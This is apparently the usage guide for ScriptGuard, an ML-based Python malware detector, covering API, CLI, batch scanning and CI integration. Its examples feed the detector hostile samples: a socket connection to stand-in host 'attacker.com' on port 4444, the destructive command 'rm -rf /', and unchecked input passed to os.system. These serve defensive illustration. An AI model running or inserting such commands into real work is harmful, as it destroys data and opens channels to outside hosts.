# ScriptGuard Usage Guide

Guide for using ScriptGuard to analyze scripts and detect malware.

## Table of Contents
- [Installation](#installation)
- [Quick Start](#quick-start)
- [API Server](#api-server)
- [Analyzing Scripts](#analyzing-scripts)
- [Batch Analysis](#batch-analysis)
- [Integration](#integration)
- [API Reference](#api-reference)

## Installation

### From Source
```bash
git clone https://github.com/yourusername/ScriptGuard.git
cd ScriptGuard
pip install -e .
```

### Using Docker
```bash
docker pull scriptguard/scriptguard:latest
docker run -p 8000:8000 scriptguard/scriptguard
```

## Quick Start

### 1. Start the API Server
```bash
python -m scriptguard.api.inference
```

API available at `http://localhost:8000`

### 2. Analyze a Script

```python
import requests

script_code = """
import os
cmd = input('Enter command: ')
os.system(cmd)
"""

response = requests.post(
    "http://localhost:8000/analyze",
    json={"code": script_code}
)

result = response.json()
print(f"Label: {result['label']}")
print(f"Confidence: {result['confidence']}")
print(f"Risk Score: {result['risk_score']}")
```

### 3. Analyze from CLI

```bash
# Analyze single file
python -m scriptguard.cli analyze suspicious_script.py

# Analyze directory
python -m scriptguard.cli analyze ./scripts/ --recursive
```

## API Server

### Starting the Server

```bash
# Default configuration
uvicorn scriptguard.api.inference:app --host 0.0.0.0 --port 8000

# With custom config
export MODEL_PATH=./models/scriptguard-model
uvicorn scriptguard.api.inference:app --host 0.0.0.0 --port 8000
```

### Configuration

Set environment variables or edit `config.yaml`:

```yaml
inference:
  host: "0.0.0.0"
  port: 8000
  max_length: 2048
  temperature: 0.1
  device: "cuda"
```

### Health Check

```bash
curl http://localhost:8000/health
```

Response:
```json
{
  "status": "healthy",
  "model_loaded": true,
  "device": "cuda"
}
```

## Analyzing Scripts

### Single Script Analysis

```python
from scriptguard.inference import ScriptGuardInference

# Initialize
analyzer = ScriptGuardInference(model_path="./models/scriptguard-model")

# Analyze
result = analyzer.analyze("""
import socket
s=socket.socket()
s.connect(('attacker.com',4444))
""")

print(result)
```

Output:
```python
{
    "label": "malicious",
    "confidence": 0.95,
    "risk_score": 9.2,
    "dangerous_patterns": ["socket", "connect"],
    "explanation": "Code establishes network connection to external host"
}
```

### Batch Analysis

```python
scripts = [
    "print('Hello World')",
    "import os; os.system('rm -rf /')",
    "def add(a, b): return a + b"
]

results = analyzer.analyze_batch(scripts)

for script, result in zip(scripts, results):
    print(f"Code: {script[:50]}...")
    print(f"Label: {result['label']} ({result['confidence']:.2f})\n")
```

### File Analysis

```python
# Analyze single file
result = analyzer.analyze_file("suspicious_script.py")

# Analyze directory
results = analyzer.analyze_directory("./scripts/", recursive=True)

# Filter malicious
malicious = [r for r in results if r['label'] == 'malicious']
print(f"Found {len(malicious)} malicious scripts")
```

### Real-time Monitoring

```python
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class ScriptHandler(FileSystemEventHandler):
    def on_created(self, event):
        if event.src_path.endswith('.py'):
            result = analyzer.analyze_file(event.src_path)
            if result['label'] == 'malicious':
                print(f"ALERT: Malicious script detected: {event.src_path}")
                print(f"Risk Score: {result['risk_score']}")

observer = Observer()
observer.schedule(ScriptHandler(), path="./monitored/", recursive=True)
observer.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    observer.stop()
observer.join()
```

## Integration

### GitHub Actions

Create `.github/workflows/scriptguard.yml`:

```yaml
name: ScriptGuard Malware Detection

on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Set up Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.10'

      - name: Install ScriptGuard
        run: pip install scriptguard

      - name: Scan Python files
        run: |
          python -m scriptguard.cli analyze . --recursive --fail-on-malicious
```

### Pre-commit Hook

Create `.git/hooks/pre-commit`:

```bash
#!/bin/bash
python -m scriptguard.cli analyze --staged --fail-on-malicious
```

### CI/CD Pipeline

```yaml
# GitLab CI
scriptguard_scan:
  stage: security
  script:
    - pip install scriptguard
    - python -m scriptguard.cli analyze . --recursive --output report.json
  artifacts:
    reports:
      security: report.json
```

### Web Application Integration

```python
from flask import Flask, request, jsonify
from scriptguard.inference import ScriptGuardInference

app = Flask(__name__)
analyzer = ScriptGuardInference()

@app.route('/api/analyze', methods=['POST'])
def analyze_code():
    code = request.json.get('code')

    if not code:
        return jsonify({"error": "No code provided"}), 400

    result = analyzer.analyze(code)

    # Log suspicious activity
    if result['label'] == 'malicious':
        log_security_event(request.remote_addr, code, result)

    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

## API Reference

### POST /analyze

Analyze a single script.

**Request:**
```json
{
  "code": "import os\nos.system('ls')",
  "options": {
    "extract_features": true,
    "explain": true
  }
}
```

**Response:**
```json
{
  "label": "malicious",
  "confidence": 0.87,
  "risk_score": 6.5,
  "dangerous_patterns": ["os.system"],
  "features": {
    "entropy": 4.2,
    "ast_complexity": 5,
    "suspicious_imports": ["os"]
  },
  "explanation": "Uses os.system for command execution"
}
```

### POST /analyze/batch

Analyze multiple scripts.

**Request:**
```json
{
  "scripts": [
    {"id": "1", "code": "print('hello')"},
    {"id": "2", "code": "import os; os.system('rm -rf /')"}
  ]
}
```

**Response:**
```json
{
  "results": [
    {"id": "1", "label": "benign", "confidence": 0.99},
    {"id": "2", "label": "malicious", "confidence": 0.98}
  ]
}
```

### POST /analyze/file

Analyze from file URL.

**Request:**
```json
{
  "url": "https://example.com/script.py"
}
```

### GET /model/info

Get model information.

**Response:**
```json
{
  "model_id": "scriptguard-v1.0",
  "base_model": "bigcode/starcoder2-3b",
  "version": "1.0.0",
  "trained_on": "2024-01-15",
  "samples": 15000
}
```

### GET /health

Health check endpoint.

## Advanced Usage

### Custom Thresholds

```python
analyzer = ScriptGuardInference(
    model_path="./models/scriptguard-model",
    malicious_threshold=0.7  # Lower = more sensitive
)
```

### Feature Extraction Only

```python
from scriptguard.steps.feature_extraction import extract_ast_features

features = extract_ast_features(code)
print(f"Function calls: {features['function_calls']}")
print(f"Dangerous patterns: {features['dangerous_patterns']}")
```

### Explainability

```python
result = analyzer.analyze(code, explain=True)

print("Explanation:", result['explanation'])
print("Contributing factors:")
for factor in result['factors']:
    print(f"  - {factor['pattern']}: {factor['severity']}")
```

## Performance Tips

1. **Batch Processing**: Use `analyze_batch()` for multiple scripts
2. **GPU Acceleration**: Ensure CUDA is available
3. **Model Quantization**: Use 4-bit quantized model for faster inference
4. **Caching**: Enable result caching for repeated analysis

```python
analyzer = ScriptGuardInference(
    model_path="./models/scriptguard-4bit",
    device="cuda",
    cache_size=1000
)
```

## Security Best Practices

1. **Sandboxing**: Run ScriptGuard in isolated environment
2. **Rate Limiting**: Implement rate limits for API
3. **Authentication**: Require API keys for production use
4. **Logging**: Log all analysis requests for audit trail
5. **Updates**: Regularly update model with new threat data

## Next Steps

- Review [TRAINING_GUIDE.md](./TRAINING_GUIDE.md) to train custom models
- Review [TUNING_GUIDE.md](./TUNING_GUIDE.md) to optimize performance
- Check API documentation at `/docs` endpoint
